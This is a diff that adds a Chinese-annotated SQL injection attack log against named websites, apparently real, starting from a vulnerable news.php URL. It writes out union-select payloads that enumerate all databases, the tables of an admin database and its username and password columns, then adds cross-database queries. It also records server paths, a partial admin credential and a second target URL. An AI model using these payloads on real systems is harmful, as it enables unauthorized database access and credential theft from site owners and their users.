@@ -1,0 +1,79 @@
+http://www.my147.com/player/web/normal/news.php?id=47
+my147@localhost5.0.27-community-ntmy147_news
+@@datadir: D:\php\mysql\Data\
+@@basedir: D:\php\mysql\             //没数据库写权限****
+爆所有库：
+%20and%201=2%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--
+结果：
+information_schema,
+my147_admin,
+my147_bbs,
+my147_com,
+my147_news,
+my147_user
+爆:my147_admin下的所有表：database()当前库
+   and%201=2%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x6D793134375F61646D696E--
+
+结果：madmin,madminmenu,odiy_adpart,odiy_bao
+爆表:madmin
+%20and%201=2%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x6D61646D696E--
+结果:aid,aname,apass,ajb,aqx,zt,logintimes,lastlogin,lastip
+
+跨库查询：当前库是my147_news, 查询my147_admin库有多少个表
+               %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94)),0,0%20from%20information_schema.tables%20where%20table_schema=0x6d793134375f61646d696e%20limit%201/*%20and%201=1 
+
+逐个爆表：
+
+        %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),table_name,char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.tables%20where%20table_schema=0x6d793134375f61646d696e%20order%20by%20table_schema%20limit%200,1)%20t%20order%20by%20table_schema%20desc)t%20limit%201/*%20and%201=1
+
+aname:ding147 apass:QUF`
+
+
+http://www.jzqyw.com/content.php?id=344190
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
